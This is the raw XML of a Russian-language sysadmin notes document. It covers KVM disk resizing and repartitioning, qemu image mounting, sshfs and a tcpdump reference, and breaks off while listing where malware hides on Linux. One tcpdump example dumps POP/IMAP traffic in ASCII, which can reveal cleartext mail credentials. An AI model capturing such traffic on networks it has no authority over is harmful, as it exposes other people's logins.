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a0d95" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P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9f510"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a0d95"/>
    </style:style>
    <style:style style:name="P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a0d95"/>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officeooo:paragraph-rsid="001a0d95"/>
    </style:style>
    <style:style style:name="P11"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a0d95"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bfb00"/>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bfb00"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bfb00"/>
    </style:style>
    <style:style style:name="P2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1bfb00"/>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c1f28" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>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c1f28"/>
    </style:style>
    <style:style style:name="P2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style:font-size-asian="14pt" style:font-size-complex="14pt"/>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d943f" style:font-size-asian="14pt" style:font-size-complex="14pt"/>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d943f" style:font-size-asian="14pt"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e29d1" style:font-size-asian="14pt" style:font-size-complex="14pt"/>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e29d1"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80" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2"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сты для браузеров:</text:p>
      <text:p text:style-name="P1">1. Использование ОЗУ после установки;</text:p>
      <text:p text:style-name="P1">2. Использование ОЗУ с 10 открытыми сайтами ((ghacks.net, startpage.com, youtube.com, betanews.com, reddit.com, slashdot.org, producthunt.com, twitch.com, amazon.com, google.com)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">3. Mozilla Kraken benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">4. JetStream benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">5. Google Octane benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">6. RoboHornet benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">7. Dromaeo benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">https://nlnetlabs.nl/projects/unbound/about/ - unbound </text:span><text:span text:style-name="T3">вместо</text:span><text:span text:style-name="T2"> bind. </text:span><text:span text:style-name="T3">UNBOUND (https://nlnetlabs.nl/projects/unbound/about/) - DNS-сервер с открытым кодом. Разработка NLnet Labs, VeriSign, Nominet и Kirei. Является рекурсивным, кэширующим DNS-сервером, соответствующим стандартам, и позиционируется как высокопроизводительная альтернатива наиболее распространенному решению в этой области - BIND. Похожие продукты в Кладовке: Simple DNSCrypt, dnscrypt-proxy, Nebulo.</text:span></text:p>
      <text:p text:style-name="P4">Быстрый совет по Linux для поиска всех файлов, которые были изменены за последние 5 минут: find . -type f -mmin -5. Полезно, когда вы устраняете неполадки и хотите знать, какие файлы были недавно изменены.</text:p>
      <text:p text:style-name="P1">Полезные команды Linux. Получение различной информации о системе: # arch</text:p>
      <text:p text:style-name="P1">Вывести на экран архитектуру компьютера: # uname -m</text:p>
      <text:p text:style-name="P1">Так-же выводит архитектуру компьютера: # cal 2010</text:p>
      <text:p text:style-name="P1">Печатает календарь на 2010 год. Без аргументов выводит календарь на текущий месяц: # cat /proc/cpuinfo</text:p>
      <text:p text:style-name="P1">Вывести подробную информацию о процессоре: # cat /proc/interrupts</text:p>
      <text:p text:style-name="P1">Вывести информацию о прерываниях: # cat /proc/meminfo</text:p>
      <text:p text:style-name="P1">Выводит статистику использования памяти: # cat /proc/swaps</text:p>
      <text:p text:style-name="P1">Вывести информацию о swap файле(ах) (файл подкачки): # cat /proc/version</text:p>
      <text:p text:style-name="P1">Вывести информацию о версии текущего ядра: # cat /proc/net/dev</text:p>
      <text:p text:style-name="P1">Вывести информацию и статистику по сетевым устройствам: # cat /proc/mounts</text:p>
      <text:p text:style-name="P1">Показать смонтированные файловые системы: # clock -w</text:p>
      <text:p text:style-name="P5">Записать текущую системную дату в BIOS: # date</text:p>
      <text:p text:style-name="P5">Вывести текущую системную дату и время: </text:p>
      <text:p text:style-name="P6"># date 041217002007.00</text:p>
      <text:p text:style-name="P6">Установить дату и время в значение МесяцДеньЧасМинутаГод.Секунда: # dmidecode -q</text:p>
      <text:p text:style-name="P1">Вывести в читабельном виде информацию по аппаратному оборудованию системы (SMBIOS / DMI): # hdparm -i /dev/hda</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>Вывести характеристики жесткого диска: # hdparm -tT /dev/sda</text:p>
      <text:p text:style-name="P1">Измерять скорость чтения данных с жесткого диска: # lspci -tv</text:p>
      <text:p text:style-name="P1">Вывести список устройств на шине PCI: # lsusb -tv</text:p>
      <text:p text:style-name="P4">Вывести список устройств на USB шине: # uname -r</text:p>
      <text:p text:style-name="P1">KVM изменить размер диска / blockresize / domblklist / guests linux / mbr /gpt</text:p>
      <text:p text:style-name="P1">Изменение диска offline / qemu-img</text:p>
      <text:p text:style-name="P1">!!! не забываем делать backup</text:p>
      <text:p text:style-name="P7">qemu-img resize vmdisk.qcow2 +10G - добавим 10Гб диску vmdisk.img</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Изменение</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">диска</text:span><text:span text:style-name="T2"> online / blockresize</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">virsh blockresize &lt;domain&gt; &lt;path&gt; &lt;size&gt;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="3"/></text:span><text:span text:style-name="T3">[--domain] &lt;строка&gt; <text:s/>имя домена, ID или UUID</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>[--path] &lt;строка&gt; <text:s/>Полный путь к блочному устройству</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>[--size] &lt;число&gt; <text:s/>Новый размер блочного устройства, кратный целому числу (по умолчанию в КиБ)</text:p>
      <text:p text:style-name="P1">virsh domblklist name_VM - узнаем какие диски есть у ВМ</text:p>
      <text:p text:style-name="P7">virsh blockresize name_VM /kvm/name_VM_disk.qcow2 100G - для ВМ (name_VM), изменим размер диска равный 100Гб</text:p>
      <text:p text:style-name="P1">Необходимые действия для гостя, при изменении диска, MBR диск / один раздел / fdisk:</text:p>
      <text:p text:style-name="P1">!!! Не забываем делать backup </text:p>
      <text:p text:style-name="P1">!!! Внимание пример для одного диска с одним разделом</text:p>
      <text:p text:style-name="P1">!!! fdisk -l - посмотреть доступные</text:p>
      <text:p text:style-name="P5"><text:s/>fdsik /dev/sda - редактируем таблицу разделов</text:p>
      <text:p text:style-name="P5"><text:s text:c="3"/>: p - показываем таблицу разделов</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>Устр-во <text:s text:c="3"/>Загрузочный Start Конец Секторы Size Id Тип</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>/dev/sda1 <text:s/>* <text:s text:c="11"/>2048 14678015 14675968 <text:s text:c="2"/>7G 83 Linux</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>: d - удаляем таблицу разделов</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="3"/></text:span><text:span text:style-name="T2">: n - </text:span><text:span text:style-name="T3">создаем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">таблицу</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">разделов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="3"/>Do you want to remove the signature? </text:span><text:span text:style-name="T3">[Y]es/[N]o: N - не удаляем сигнатуры</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>: a - ставим ставим загрузочный бит</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>: w - применяем изменения</text:p>
      <text:p text:style-name="P5">!!! после выхода из (fdisk) будет сказано что изменена таблица разделов и необходимо выполнить partprobe</text:p>
      <text:p text:style-name="P5">(name_VM)# partprobe - выполняем просим систему перечитать таблицу разделов</text:p>
      <text:p text:style-name="P7">(name_VM)# resize2fs /dev/sda1 - выполняем изменения FS</text:p>
      <text:p text:style-name="P1">Необходимые действия для гостя, при изменении диска, MBR диск / несколько разделов / parted:</text:p>
      <text:p text:style-name="P1">!!! Не забываем делать backup </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>!!! Внимание пример для одного диска и нескольких разделов</text:p>
      <text:p text:style-name="P1">!!! fdisk -l - посмотреть доступные</text:p>
      <text:p text:style-name="P1">Пример (parted)</text:p>
      <text:p text:style-name="P1">(name_VM)# parted /dev/vda - открываем нужный диск</text:p>
      <text:p text:style-name="P1"><text:s text:c="11"/>(parted) print free - покажем доступные <text:s/>разделы (диск /dev/vda)</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="15"/></text:span><text:span text:style-name="T2">Number Start End Size Type File system Flags</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="15"/>1 32.3kB 4295MB 4295MB primary ext4 boot</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="15"/>2 4295MB 8590MB 4295MB primary linux-swap(v1)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="15"/>3 8590MB 107GB 98GB primary ext4</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="17"/>107GB 215GB 107GB Free Space</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="11"/></text:span><text:span text:style-name="T3">(parted) resizepart 3 - изменяем размер третьего раздела</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="15"/></text:span><text:span text:style-name="T2">End [107GB]? 215GB</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="11"/>(parted) quit - </text:span><text:span text:style-name="T3">выходим</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> parted</text:span></text:p>
      <text:p text:style-name="P1">(name_VM)#partprobe - выполняем просим систему перечитать таблицу разделов</text:p>
      <text:p text:style-name="P7">(name_VM)#resize2fs /dev/vda3 - <text:s/>выполняем изменения FS</text:p>
      <text:p text:style-name="P1">Необходимые действия для гостя, при изменении диска, GBT диск / несколько разделов / parted: !!! GPT Рассматривается схема с одним разделом (/dev/vdb1) на весь диск</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(name_VM)#partprobe</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(name_VM)#gdisk /dev/vdb</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/></text:span><text:span text:style-name="T3">переходим в расширенный режим x</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>смещаем запись в конец диска e</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>выходим из расширенного режима m</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>Command (? for help): d</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="2"/></text:span><text:span text:style-name="T2">Using 1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Command (? for help): n</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Partition number (1-128, default 1): [Enter]</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>First sector (34-2147483614, default = 2048) or {+-}size{KMGTP}: [Enter]</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Last sector (2048-2147483614, default = 2147483614) or {+-}size{KMGTP}: [Enter]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Current type is 'Linux filesystem'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Hex code or GUID (L to show codes, Enter = 8300): [Enter]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Changed type of partition to 'Linux filesystem'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/></text:span><text:span text:style-name="T3">выходим с сохранением w</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(name_VM)#partprobe</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(name_VM)#resize2fs /dev/vdb1 </text:span><text:span text:style-name="T3">или</text:span></text:p>
      <text:p text:style-name="P9" loext:marker-style-name="T1"><text:span text:style-name="T2">btrfs filesystem resize max /&lt;MOUNTPOINT&gt;</text:span></text:p>
      <text:p text:style-name="P10" loext:marker-style-name="T1"><text:span text:style-name="T3">Смонтировать образ диска qcow2 в гипервизоре:</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">modprobe nbd max_part=8</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">qemu-nbd --connect=/dev/nbd0 &lt;PATH-TO-IMAGE&gt;.qcow2</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">fdisk /dev/nbd0 -l</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mount -o ro /dev/nbd0p1 /mnt/ext0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">umount /mnt/ext0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">qemu-nbd --disconnect /dev/nbd0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">rmmod nbd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ssh - sshfs </text:span><text:span text:style-name="T3">монтирование</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">шары</text:span></text:p>
      <text:p text:style-name="P1">SSHFS - монтирование файловых систем средствами ssh</text:p>
      <text:p text:style-name="P1">apt-get install sshfs - установка</text:p>
      <text:p text:style-name="P1">mkdir /mnt/docs - создаем папку для монтирования</text:p>
      <text:p text:style-name="P1">sshfs user@server.com:/var/docs /mnt/docs - монтируем фс используя sshfs</text:p>
      <text:p text:style-name="P1">fusermount -u /var/docs - демонтируем удаленную папку</text:p>
      <text:p text:style-name="P1">монтирование шары sshfs /etc/fstab:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">ИМЯ</text:span><text:span text:style-name="T2">@</text:span><text:span text:style-name="T3">ИП</text:span><text:span text:style-name="T2">:/REMOTE/DIR <text:s/>/LOCAL/MOUNT <text:s/>fuse.sshfs _netdev,user,idmap=user,transform_symlinks,identityfile=/home/</text:span><text:span text:style-name="T3">ИМЯ</text:span><text:span text:style-name="T2">/.ssh/id_rsa,allow_other,default_permissions,uid=</text:span><text:span text:style-name="T3">ИД</text:span><text:span text:style-name="T2">,gid=</text:span><text:span text:style-name="T3">ИД</text:span><text:span text:style-name="T2"> 0 0</text:span></text:p>
      <text:p text:style-name="P1">sshfs для windows:</text:p>
      <text:p text:style-name="P1">Dokan SSHFS - монтирование удаленного сетевого хранилища при помощи ssh для Windows</text:p>
      <text:p text:style-name="P1">https://github.com/dokan-dev/dokany/releases/tag/v1.1.0.2000</text:p>
      <text:p text:style-name="P1">sshfs - монтирование удаленной папки подробней:</text:p>
      <text:p text:style-name="P1">Fuse - это модуль ядра (недавно он был принят в официальную ветку 2.6), позволяющий непривилегированным пользователям монтировать различные</text:p>
      <text:p text:style-name="P1">файловые системы. </text:p>
      <text:p text:style-name="P1">Sshfs - это программа, созданная самим автором fuse, которая позволяет монтировать удаленные папки или файловые системы, используя ssh. </text:p>
      <text:p text:style-name="P5">Суть проста - удаленная папка монтируются в папку локальной файловой системы. <text:s/>После этого все операции над этой папкой производятся, как если бы это была обычная локальная папка, с той только разницей, что файлы перемещаются через ssh в фоновом режиме. После установки программы остается только добавить пользователя, которому мы хотим предоставить право на монтирование файловых систем через ssh, в группу fuse.</text:p>
      <text:p text:style-name="P12"># usermod -G -a fuse user1</text:p>
      <text:p text:style-name="P1">или</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># adduser user1 fuse</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">вручную</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">отредактировав</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> /etc/group. </text:span></text:p>
      <text:p text:style-name="P1">Также необходимо, чтобы был загружен модуль fuse:</text:p>
      <text:p text:style-name="P1"># modprobe fuse</text:p>
      <text:p text:style-name="P1">Если мы планируем использовать fuse и sshfs регулярно, то нужно добавить fuse в файл /etc/modules. </text:p>
      <text:p text:style-name="P1">sshfs user1@remote_server:/tmp ~/remote_folder - смонтировать удаленную папку с помощью sshfs</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">fusermount -u ~/remote_folder - мы можем отмантировать ее</text:span></text:p>
      <text:p text:style-name="P1">Если мы постоянно работаем с этой папкой, то можно добавить ее в таблицу /etc/fstab. </text:p>
      <text:p text:style-name="P1">При этом она будет автоматически монтироваться при загрузке системы,</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">/tmp /home/user1/remote_folder/ fuse defaults,auto 0 0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump / </text:span><text:span text:style-name="T3">снифер</text:span><text:span text:style-name="T2"> / sniffer</text:span></text:p>
      <text:p text:style-name="P1">Установка</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">yum install tcpdump - </text:span><text:span text:style-name="T3">установка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> centos</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt install tcpdump - </text:span><text:span text:style-name="T3">установка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> debian</text:span></text:p>
      <text:p text:style-name="P1">Опции утилиты tcpdump:</text:p>
      <text:p text:style-name="P1">-i интерфейс # Задает интерфейс, с которого необходимо анализировать трафик (без указания интерфейса - анализ "первого попавшегося")</text:p>
      <text:p text:style-name="P1">-n # Отключает преобразование IP в доменные имена. Если указано -nn, то запрещается преобразование номеров портов в название протокола.</text:p>
      <text:p text:style-name="P1">-e # Включает вывод данных канального уровня (например, MAC-адреса).</text:p>
      <text:p text:style-name="P1">-v # Вывод дополнительной информации (TTL, опции IP).</text:p>
      <text:p text:style-name="P1">-s размер # Указание размера захватываемых пакетов. (по умолчанию - пакеты больше 68 байт)</text:p>
      <text:p text:style-name="P1">-w имя_файла # Задать имя файла, в который сохранять собранную информацию.</text:p>
      <text:p text:style-name="P1">-r имя_файла # Чтение дампа из заданного файла.</text:p>
      <text:p text:style-name="P1">-p # Захватывать только трафик, предназначенный данному узлу. (по умолчанию - захват всех пакетов, например в том числе широковещательных).</text:p>
      <text:p text:style-name="P1">-q # Переводит tcpdump в "бесшумный режим", пакет анализируется на транспортном уровне (протоколы TCP, UDP, ICMP), а не на сетевом (протокол IP).</text:p>
      <text:p text:style-name="P7">-t # Отключает вывод меток времени.</text:p>
      <text:p text:style-name="P1">Наиболее часто используемые фильтрующие параметры команды tcpdump:</text:p>
      <text:p text:style-name="P1">dst хост # Проверяет, совпадает ли адрес получателя IP-пакета с указанным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:p>
      <text:p text:style-name="P1">src хост # Проверяет, совпадает ли адрес отправителя IP пакета с указанным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:p>
      <text:p text:style-name="P5">host хост # Проверяет, совпадает ли адрес отправителя или получателя с заданным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:p>
      <text:p text:style-name="P5">net имя_сети # Проверяется, находится ли адрес отправителя/получателя в заданной сети. Возможно указание сети в формате CIDR (например, 10.0.0.1/22), либо указание имени сети, заданной в файле /etc/networks.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">ip | arp | rarp | tcp | udp | icmp [хост] # Проверяет, принадлежит ли пакет одному из указанных протоколов и при указании адреса хоста проверяет, </text:span><text:soft-page-break/><text:span text:style-name="T3">совпадает ли адрес отправителя\получателя с заданным. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:span></text:p>
      <text:p text:style-name="P1">[tcp | udp] dst port номер_порта # Проверяется, принадлежит ли пакет протоколу TCP/UDP и равен ли порт назначения заданному. Можно указать номер порта, либо имя, заданное в файле /etc/services.</text:p>
      <text:p text:style-name="P1">[tcp | udp] src port номер_порта # Проверяется, принадлежит ли пакет протоколу TCP/UDP и равен ли порт источника заданному. Можно указать номер порта, либо имя, заданное в файле /etc/services.</text:p>
      <text:p text:style-name="P1">[tcp | udp] port номер_порта # Проверяется, принадлежит ли пакет протоколу TCP/UDP и равен ли порт назначения или источника заданному.</text:p>
      <text:p text:style-name="P1">Можно указать номер порта, либо имя, заданное в файле /etc/services.</text:p>
      <text:p text:style-name="P1">ether { src | dst | host } MAC_адрес # Проверяется, принадлежит ли сетевой пакет источнику, назначению, источнику или назначению имеющему заданный MAC_адрес.</text:p>
      <text:p text:style-name="P1">ip broadcast # Проверяется, является ли IP пакет широковещательным.</text:p>
      <text:p text:style-name="P7">ether broadcast # Проверяется, является ли ARP-пакет широковещательным.</text:p>
      <text:p text:style-name="P1">Примеры использования tcpdump:</text:p>
      <text:p text:style-name="P1">tcpdump -i eth0 # слушаем интерфейс eth0</text:p>
      <text:p text:style-name="P1">tcpdump port 80 # слушаем 80 порт</text:p>
      <text:p text:style-name="P1">tcpdump host google.com # слушаем трафик с хоста google.com</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -n -i eth0 icmp # </text:span><text:span text:style-name="T3">Ловим</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакеты</text:span><text:span text:style-name="T2"> icmp (ping pong)</text:span></text:p>
      <text:p text:style-name="P1">tcpdump | grep -v ssh # поиск пакетов исключая пакеты ssh</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -n -i eth0 net 192.168.1.15 # </text:span><text:span text:style-name="T3">трафик</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2">/</text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> IP</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -n -i eth0 net 192.168.1.0/24 # </text:span><text:span text:style-name="T3">трафик</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2">/</text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сеть</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -l &gt; dump &amp;&amp; tail -f dump # </text:span><text:span text:style-name="T3">Вывод</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">записью</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span></text:p>
      <text:p text:style-name="P1">tcpdump -i eth0 -w traffic.eth0 # Информация о трафике записывается в бинарный файл traffic.eth0</text:p>
      <text:p text:style-name="P1">tcpdump -i eth0 -s 0 -w traffic.eth0 # Запись + загрузка в бинарный файл</text:p>
      <text:p text:style-name="P1">tcpdump -r traffic.eth0 # Читаем из файла</text:p>
      <text:p text:style-name="P1">tcpdump -i eth0 -X port \(110 or 143\) # Проверка pop и imap на безопасность</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -i eth0 -s 0 -A port 80 | grep GET # (-s 0 </text:span><text:span text:style-name="T3">весь</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакет</text:span><text:span text:style-name="T2">, -A </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> ASCII)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -npi iface_name ether src MAC-address # </text:span><text:span text:style-name="T3">узнать</text:span><text:span text:style-name="T2"> MAC </text:span><text:span text:style-name="T3">устройства</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iface_name -</text:span><text:span text:style-name="T3">имя</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">интерфейса</text:span><text:span text:style-name="T2"> MAC-address -</text:span><text:span text:style-name="T3">мак</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">адрес</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">устройства</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -vvv -s 0 -l -n port 53 # </text:span><text:span text:style-name="T3">показываем</text:span><text:span text:style-name="T2"> DNS </text:span><text:span text:style-name="T3">трафик</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -nl -i bge0 not port ssh and src \(192.168.16.121 or 192.168.16.54\)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">tcpdump -n -i eth1 net 192.168.16.121 # Выборка входящий/исходящий по одному IP адресу</text:p>
      <text:p text:style-name="P1">tcpdump -n -i eth1 net 192.168.16.0/24 # Выборка входящий/исходящий по адресу сети</text:p>
      <text:p text:style-name="P5">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод через буфер</text:p>
      <text:p text:style-name="P5">tcpdump -i rl0 -w traffic.rl0 # Писать заголовки в бинарный файл</text:p>
      <text:p text:style-name="P1">tcpdump -i rl0 -s 0 -w traffic.rl0 # Писать в бинарный фйл полные пакеты</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">tcpdump -r traffic.rl0 # Прочитать из файла (так-же для ethereal</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -i eth0 -s 0 -A port 80 | grep GET <text:s text:c="5"/># -s 0 </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">полных</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакетов</text:span><text:span text:style-name="T2">, -A </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> ASCII</text:span></text:p>
      <text:p text:style-name="P1">Где искать вредоносный код в linux</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">var</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">at</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">tabs</text:span><text:span text:style-name="T3">/&lt;</text:span><text:span text:style-name="T2">username</text:span><text:span text:style-name="T3">&gt; /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ttys</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">pro</text:span><text:span text:style-name="T3">ﬁ</text:span><text:span text:style-name="T2">le</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bashrc</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cshrc</text:span><text:span text:style-name="T3"> /</text:span><text:span 